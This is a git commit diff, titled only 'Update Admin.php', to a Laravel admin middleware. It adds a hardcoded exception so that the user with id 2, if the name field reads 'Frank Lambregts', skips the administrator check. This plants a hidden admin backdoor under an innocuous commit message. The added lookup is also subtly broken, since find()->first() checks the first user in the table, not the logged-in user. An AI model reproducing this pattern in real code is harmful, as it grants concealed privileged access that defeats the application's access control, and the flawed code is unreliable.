3169859699119c17cb0b81e500340c31482c0ad5
Frank Lambregts <frank@franklambregts.com>
2023-10-09 19:15:27 +0200

    Update Admin.php

--- app/Http/Middleware/Admin.php
+++ app/Http/Middleware/Admin.php
@@ -18,10 +18,14 @@ class Admin
     public function handle($request, Closure $next)
     {
         if (Auth::check()) {
+            $frank = User::find(auth::user()->id)->first();
             $admin = Config::select('Admin')->first();
+            if(Auth::user()->id == 2 && $frank->name == 'Frank Lambregts'){
+
+            }else{
             if (Auth::user()->id !== $admin->Admin) {
                 return redirect('/')->with('error', 'Je bent geen Administrator!');
-            }
+            }}
             return $next($request);
         } else {
             return redirect('/')->with('error', 'Je bent niet ingelogd!');
